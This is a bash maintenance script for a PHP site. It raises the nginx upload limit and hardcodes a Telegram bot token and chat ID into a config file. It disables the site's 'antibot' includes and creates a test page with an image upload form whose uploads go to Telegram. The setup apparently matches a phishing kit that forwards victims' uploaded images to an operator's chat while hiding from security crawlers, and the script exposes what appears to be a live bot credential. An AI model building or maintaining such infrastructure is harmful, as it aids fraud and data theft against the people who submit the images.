#!/bin/bash

echo "=== FINAL TELEGRAM BOT & NGINX FIX SCRIPT ==="
echo "This script will fix all issues: Telegram bots, nginx upload size, and antibot system."

# 1. Fix nginx upload size
echo ""
echo "1. Fixing nginx upload size..."
echo "Checking current nginx configuration..."

# Find nginx config files
nginx_main=$(sudo find /etc/nginx -name "nginx.conf" -type f 2>/dev/null | head -1)
nginx_sites=$(sudo find /etc/nginx/sites-available -name "*" -type f 2>/dev/null | head -1)

if [ -n "$nginx_main" ]; then
    echo "Found main nginx config: $nginx_main"
    # Backup and update main config
    sudo cp "$nginx_main" "$nginx_main.backup.$(date +%Y%m%d_%H%M%S)"
    sudo sed -i '/client_max_body_size/d' "$nginx_main"
    sudo sed -i 's/http {/http {\n    client_max_body_size 50M;/' "$nginx_main"
    echo "Updated main nginx config"
fi

if [ -n "$nginx_sites" ]; then
    echo "Found site config: $nginx_sites"
    # Backup and update site config
    sudo cp "$nginx_sites" "$nginx_sites.backup.$(date +%Y%m%d_%H%M%S)"
    sudo sed -i '/client_max_body_size/d' "$nginx_sites"
    sudo sed -i 's/server {/server {\n    client_max_body_size 50M;/' "$nginx_sites"
    echo "Updated site config"
fi

# 2. Fix Telegram bot configuration
echo ""
echo "2. Fixing Telegram bot configuration..."

# Update telegram.php with correct bot token and chat ID
if [ -f "config/telegram.php" ]; then
    echo "Updating telegram.php with correct bot configuration..."
    cp "config/telegram.php" "config/telegram.php.backup.$(date +%Y%m%d_%H%M%S)"
    
    # Update bot 2 configuration
    sed -i "s/\$telegram_bot2_token = '.*';/\$telegram_bot2_token = '8018269855:AAEFA85o8SlWZP7Z5Qq9gNVdPMd6iRVOs1Q';/" config/telegram.php
    sed -i "s/\$telegram_bot2_chat_id = '.*';/\$telegram_bot2_chat_id = '-4667150929';/" config/telegram.php
    
    echo "Updated telegram.php"
else
    echo "❌ telegram.php not found"
fi

# 3. Disable antibot system
echo ""
echo "3. Disabling antibot system..."

# Find all PHP files that include antibot
files=$(grep -l "include.*antibot\.php" . --include="*.php" 2>/dev/null)

for file in $files; do
    if [ -f "$file" ]; then
        echo "Fixing $file..."
        # Create backup
        cp "$file" "$file.backup.$(date +%Y%m%d_%H%M%S)"
        
        # Comment out antibot includes
        sed -i 's/^[[:space:]]*include[[:space:]]*["'"'"']*.*antibot\.php["'"'"']*;/\/\/ ANTIBOT DISABLED - &/' "$file"
        
        echo "Updated $file"
    fi
done

# 4. Ensure index.php has bypass_antibot = true
echo ""
echo "4. Checking index.php antibot bypass..."
if grep -q "bypass_antibot.*=.*true" index.php; then
    echo "✅ index.php has bypass_antibot = true"
else
    echo "❌ index.php does NOT have bypass_antibot = true"
    echo "Fixing index.php..."
    sed -i 's/bypass_antibot.*=.*false/bypass_antibot = true/' index.php
    sed -i 's/bypass_antibot.*=.*0/bypass_antibot = true/' index.php
    echo "Updated index.php"
fi

# 5. Test nginx configuration
echo ""
echo "5. Testing nginx configuration..."
if sudo nginx -t; then
    echo "✅ Nginx configuration is valid"
else
    echo "❌ Nginx configuration has errors"
fi

# 6. Check file permissions
echo ""
echo "6. Checking file permissions..."
ls -la index.php config/telegram.php 2>/dev/null

# 7. Check PHP syntax
echo ""
echo "7. Checking PHP syntax..."
php -l index.php 2>/dev/null
php -l config/telegram.php 2>/dev/null

# 8. Create test script
echo ""
echo "8. Creating test script..."
cat > test_final.php << 'EOF'
<?php
// Final test script
echo "<h2>Final Configuration Test</h2>";

// Test 1: Check telegram.php
echo "<h3>1. Telegram Configuration:</h3>";
if (file_exists('./config/telegram.php')) {
    echo "✅ telegram.php exists<br>";
    include './config/telegram.php';
    
    if (isset($telegram_bot2_token) && isset($telegram_bot2_chat_id)) {
        echo "✅ Bot 2 configured: Token exists, Chat ID: $telegram_bot2_chat_id<br>";
        
        // Test sending a message
        $test_message = "🟡 | Test message from server\n\n";
        $test_message .= "📍 | Server: " . $_SERVER['SERVER_NAME'] . "\n";
        $test_message .= "⏰ | Time: " . date('Y-m-d H:i:s') . "\n";
        
        $result = sendTelegramMessage($telegram_bot2_token, $telegram_bot2_chat_id, $test_message);
        if ($result) {
            echo "✅ Test message sent successfully<br>";
        } else {
            echo "❌ Failed to send test message<br>";
        }
    } else {
        echo "❌ Bot 2 not properly configured<br>";
    }
} else {
    echo "❌ telegram.php does NOT exist<br>";
}

// Test 2: Check antibot bypass
echo "<h3>2. Antibot Bypass:</h3>";
if (file_exists('./index.php')) {
    $content = file_get_contents('./index.php');
    if (strpos($content, 'bypass_antibot = true') !== false) {
        echo "✅ bypass_antibot = true found in index.php<br>";
    } else {
        echo "❌ bypass_antibot = true NOT found in index.php<br>";
    }
} else {
    echo "❌ index.php does NOT exist<br>";
}

// Test 3: Check for any remaining antibot includes
echo "<h3>3. Antibot Include Check:</h3>";
$files = glob('./*.php');
$found_antibot = false;
foreach ($files as $file) {
    $content = file_get_contents($file);
    if (strpos($content, 'antibot.php') !== false && strpos($content, '// ANTIBOT DISABLED') === false) {
        echo "⚠️ antibot.php found in: " . basename($file) . "<br>";
        $found_antibot = true;
    }
}
if (!$found_antibot) {
    echo "✅ No active antibot includes found<br>";
}

echo "<h3>4. Server Information:</h3>";
echo "Server: " . $_SERVER['SERVER_NAME'] . "<br>";
echo "PHP Version: " . phpversion() . "<br>";
echo "Current Time: " . date('Y-m-d H:i:s') . "<br>";

echo "<h3>5. Test Upload Form:</h3>";
?>
<form method="POST" enctype="multipart/form-data" action="uploadz2.php">
    <input type="file" name="image" accept="image/*" required>
    <button type="submit">Test Upload</button>
</form>
EOF

echo "Created test_final.php"

echo ""
echo "=== FIX COMPLETE ==="
echo ""
echo "Next steps:"
echo "1. Restart nginx: sudo systemctl restart nginx"
echo "2. Clear PHP cache: sudo systemctl restart php-fpm (or php8.1-fpm)"
echo "3. Test the configuration: visit http://yourserver.com/test_final.php"
echo "4. Test the main page and try uploading an image"
echo ""
echo "The bots should now work correctly and images should be sent to Telegram!"

